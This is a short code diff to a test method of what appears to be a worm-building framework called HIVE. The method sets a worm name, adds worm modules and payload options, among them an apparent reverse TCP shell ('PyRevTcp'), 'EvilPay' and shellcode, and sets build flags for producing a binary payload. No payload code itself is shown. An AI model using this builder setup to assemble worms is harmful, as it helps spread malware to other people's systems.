@@ -46,13 +46,24 @@ class Queen:
     def test(self) -> None:
         self.msg("msg", "Test HIVE")
         conf = {}
+        conf["FLAG_NO_COMPILE"] = True
+        conf["BUILD_PAYLOAD"] = True
+        conf["MODULE_INFO"] = "My first bin payload. Worm Kicha."
+        #conf["BUILD_SHELLCODE_PAYLOAD"] = True
         
         #self.master_compiler.coreInstall("CrossCompCore")
-        self.rawBuilder.setWormName("kiszajec")
-        self.rawBuilder.Add("worm", "Kicha")
-        self.rawBuilder.Add("rscript", "BasicRes")
-        self.rawBuilder.setIcon("worm1.ico")
-        # self.rawBuilder.Add("payload", "PyRevTcp")
+        self.rawBuilder.setWormName("montek")
+        self.rawBuilder.Add("worm", "Montezuma")
+        self.rawBuilder.Add("module", "AkMod")
+        self.rawBuilder.removeWormItem("module", "AkMod")
+        # self.rawBuilder.Add("worm", "Kapelusz")
+        # self.rawBuilder.Add("payload", "EvilPay")
+        # self.rawBuilder.removeWormItem("compiler", "PyInstaller")
+        #self.rawBuilder.removeWormItem("payload", "EvilPay")
+        #self.rawBuilder.Add("scode", "MsgBoxA")
+        # self.rawBuilder.Add("rscript", "BasicRes")
+        # self.rawBuilder.setIcon("worm1.ico")
+        #self.rawBuilder.Add("payload", "PyRevTcp")
         # self.rawBuilder.Add("scode", "MsgBoxA")
         #self.rawBuilder.Add("worm", "Asmek")
         # self.rawBuilder.Add("worm", "Montezuma")
@@ -68,7 +79,7 @@ class Queen:
 
         # self.rawBuilder.test()
         self.rawBuilder.showWorm()
-        self.wormConstructor.buildWorm(options=conf)
+        #self.wormConstructor.buildWorm(options=conf)
 
     
         
